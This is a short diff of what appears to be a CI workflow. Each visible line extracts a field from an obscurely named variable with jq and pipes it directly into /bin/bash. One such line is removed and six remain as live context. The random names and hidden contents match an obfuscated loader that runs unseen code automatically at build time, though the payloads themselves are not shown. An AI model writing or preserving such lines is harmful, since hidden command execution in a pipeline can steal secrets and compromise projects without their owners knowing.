@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$bz41577" | jq -r .qpitr0 | /bin/bash
           echo $li7 | jq -r .vy5 | /bin/bash
           echo $tbkj13126 | jq -r .odvdo7953 | /bin/bash
-          printf '%s' "$c909" | jq -r .mthfz28 | /bin/bash
           echo $aqc738 | jq -r .usxjr96394 | /bin/bash
           echo $co0 | jq -r .ssv7 | /bin/bash
           echo $wfuev46 | jq -r .kxu13774 | /bin/bash
